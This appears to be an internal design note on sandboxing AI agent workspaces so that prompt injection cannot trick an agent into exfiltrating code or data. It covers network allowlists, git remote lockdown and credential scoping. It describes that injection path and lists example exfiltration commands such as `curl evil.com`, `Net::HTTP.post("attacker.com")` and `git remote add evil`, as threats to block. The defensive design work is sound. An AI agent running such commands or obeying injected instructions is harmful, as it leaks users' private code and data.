# Workspace Security: Preventing Data Exfiltration

## Problem

Agent workspaces have access to tools like `ruby` that allow arbitrary code
execution. A prompt injection attack could trick the agent into exfiltrating
sensitive data (e.g., posting code or data to an attacker-controlled gist,
remote server, or repo).

## Approach: Network-Level Sandboxing

Prompt-level guardrails ("never make network calls") are easily bypassed by
injection. The defense must be at the infrastructure level.

### 1. Network allowlist

The workspace should block all outbound network access except:

- **Git host** — e.g., `github.com/specific-org/*` (not all of GitHub)
- **Package registries** — rubygems.org, npmjs.com, etc.
- **App's own services** — database, internal APIs the project needs

Everything else is denied at the firewall/network namespace level. This stops
`curl evil.com`, `Net::HTTP.post("attacker.com")`, etc.

### 2. Git remote lockdown

Allowlisting the git host alone isn't enough — the agent could `git remote add`
a different repo and push there.

Mitigations:

- **Prevent remote mutation** — Reject `git remote add`, `git remote set-url`,
  and similar commands. Either make `.git/config` read-only or wrap git to block
  remote-mutating subcommands.
- **Allowlist by exact remote URL** — Only allow push to the origin URL already
  configured in the repo's `.git/config` at workspace creation time.

### 3. Credential scoping

The workspace's git credentials should only grant access to the specific repos
it needs:

- **Deploy keys** scoped to one repo (SSH)
- **Fine-grained PATs** scoped to specific repos (HTTPS)

Even if the agent tries to push to another repo on the same host, auth fails.

### 4. Combined defense

The layers work together:

| Attack vector                  | Blocked by                          |
|--------------------------------|-------------------------------------|
| `curl attacker.com`            | Network allowlist                   |
| `Net::HTTP.post("evil.com")`   | Network allowlist                   |
| `git push` to attacker's repo  | Remote lockdown + credential scoping|
| `git remote add evil ...`      | Remote mutation prevention          |
| Push to allowed host, wrong repo | Credential scoping                |

## Open Questions

- How to handle package installation that needs network (e.g., `bundle install`)?
  Probably allowed via registry allowlist, but could also pre-install deps at
  workspace creation time.
- Do we need read-only filesystem areas beyond `.git/config`? (e.g., prevent
  writing to `/etc/hosts` to bypass DNS allowlists)
- Should `ruby` tool execution happen in a further-restricted subprocess
  (e.g., seccomp/nsjail) even within the workspace container?
